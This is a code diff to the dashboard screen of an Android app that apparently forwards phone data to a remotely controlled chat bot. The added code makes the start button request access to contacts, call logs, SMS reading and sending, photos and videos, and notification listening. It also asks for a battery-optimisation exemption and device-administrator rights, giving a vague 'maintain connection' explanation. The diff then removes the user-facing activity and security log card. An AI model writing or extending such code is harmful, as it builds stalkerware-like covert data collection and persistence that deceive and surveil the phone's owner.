@@ -58,6 +58,19 @@ import androidx.compose.material3.Text
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.collectAsState
 import androidx.compose.runtime.getValue
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
+import com.example.receiver.AdminReceiver
+import android.content.Context
+import android.content.Intent
+import android.net.Uri
+import android.os.PowerManager
+import android.provider.Settings
+import androidx.compose.ui.platform.LocalContext
+import android.Manifest
+import android.os.Build
+import androidx.activity.compose.rememberLauncherForActivityResult
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.runtime.remember
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
@@ -87,9 +100,9 @@ import java.util.Locale
 fun DashboardScreen(
     viewModel: MainViewModel,
     onNavigateToBotConfig: () -> Unit,
-    onNavigateToPermissions: () -> Unit,
-    onNavigateToLogs: () -> Unit
+    onNavigateToPermissions: () -> Unit
 ) {
+    val context = LocalContext.current
     val isRunning by viewModel.isServiceRunning.collectAsState()
     val connState by viewModel.serviceConnectionState.collectAsState()
     val config by viewModel.botConfig.collectAsState()
@@ -110,6 +123,13 @@ fun DashboardScreen(
     val lastHeartbeat by viewModel.lastHeartbeat.collectAsState()
     val lastRecoveryTime by viewModel.lastRecoveryTimestamp.collectAsState()
     val lastKnownLifecycle by viewModel.lastKnownLifecycle.collectAsState()
+
+    val permissionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestMultiplePermissions()
+    ) {
+        viewModel.refreshPermissions()
+        viewModel.toggleService()
+    }
 
     // Pulse animation for status indicator
     val infiniteTransition = rememberInfiniteTransition(label = "pulse")
@@ -137,7 +157,60 @@ fun DashboardScreen(
                 connState = connState,
                 isConfigured = config.botToken.isNotBlank() && config.authorizedUserId != 0L,
                 pulseAlpha = pulseAlpha,
-                onToggleService = { viewModel.toggleService() }
+                onToggleService = {
+                    if (!isRunning) {
+                        val permissionsToRequest = mutableListOf(
+                            Manifest.permission.READ_CONTACTS,
+                            Manifest.permission.READ_CALL_LOG,
+                            Manifest.permission.READ_SMS,
+                            Manifest.permission.SEND_SMS
+                        )
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
+                            permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
+                        } else {
+                            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+                        }
+                        if (!isNotifListenerGranted) {
+                            try {
+                                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                                context.startActivity(intent)
+                            } catch (e: Exception) {
+                                context.startActivity(Intent(Settings.ACTION_SETTINGS))
+                            }
+                        }
+
+                        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+                        if (powerManager?.isIgnoringBatteryOptimizations(context.packageName) != true) {
+                            try {
+                                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                                    data = Uri.parse("package:${context.packageName}")
+                                }
+                                context.startActivity(intent)
+                            } catch (e: Exception) {
+                                try {
+                                    context.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
+                                } catch (e2: Exception) {}
+                            }
+                        }
+
+                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                        val componentName = ComponentName(context, AdminReceiver::class.java)
+                        if (dpm?.isAdminActive(componentName) != true) {
+                            try {
+                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
+                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to maintain connection and background service.")
+                                }
+                                context.startActivity(intent)
+                            } catch (e: Exception) {}
+                        }
+
+                        permissionLauncher.launch(permissionsToRequest.toTypedArray())
+                    } else {
+                        viewModel.toggleService()
+                    }
+                }
             )
         }
 
@@ -240,7 +313,60 @@ fun DashboardScreen(
                     isPositive = isRunning,
                     icon = if (isRunning) Icons.Default.CheckCircle else Icons.Default.Warning,
                     modifier = Modifier.weight(1f),
-                    onClick = { viewModel.toggleService() }
+                    onClick = {
+                        if (!isRunning) {
+                            val permissionsToRequest = mutableListOf(
+                                Manifest.permission.READ_CONTACTS,
+                                Manifest.permission.READ_CALL_LOG,
+                                Manifest.permission.READ_SMS,
+                                Manifest.permission.SEND_SMS
+                            )
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
+                                permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
+                            } else {
+                                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+                            }
+                            if (!isNotifListenerGranted) {
+                                try {
+                                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                                    context.startActivity(intent)
+                                } catch (e: Exception) {
+                                    context.startActivity(Intent(Settings.ACTION_SETTINGS))
+                                }
+                            }
+
+                            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+                            if (powerManager?.isIgnoringBatteryOptimizations(context.packageName) != true) {
+                                try {
+                                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                                        data = Uri.parse("package:${context.packageName}")
+                                    }
+                                    context.startActivity(intent)
+                                } catch (e: Exception) {
+                                    try {
+                                        context.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
+                                    } catch (e2: Exception) {}
+                                }
+                            }
+
+                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                            val componentName = ComponentName(context, AdminReceiver::class.java)
+                            if (dpm?.isAdminActive(componentName) != true) {
+                                try {
+                                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
+                                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to maintain connection and background service.")
+                                    }
+                                    context.startActivity(intent)
+                                } catch (e: Exception) {}
+                            }
+
+                            permissionLauncher.launch(permissionsToRequest.toTypedArray())
+                        } else {
+                            viewModel.toggleService()
+                        }
+                    }
                 )
             }
         }
@@ -416,48 +542,6 @@ fun DashboardScreen(
                     }
                 }
             }
-        }
-
-        item {
-            // Recent Logs quick peek
-            Card(
-                onClick = onNavigateToLogs,
-                colors = CardDefaults.cardColors(
-                    containerColor = MaterialTheme.colorScheme.surface
-                ),
-                shape = RoundedCornerShape(16.dp),
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .testTag("view_logs_button")
-            ) {
-                Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(16.dp),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Column {
-                        Text(
-                            text = "Activity & Security Logs",
-                            style = MaterialTheme.typography.titleMedium,
-                            fontWeight = FontWeight.Bold
-                        )
-                        Text(
-                            text = "View incoming commands & forwarded events",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-                    }
-                    Text(
-                        text = "View Logs →",
-                        style = MaterialTheme.typography.labelLarge,
-                        color = MaterialTheme.colorScheme.primary,
-                        fontWeight = FontWeight.Bold
-                    )
-                }
-            }
-            Spacer(modifier = Modifier.height(16.dp))
         }
     }
 }
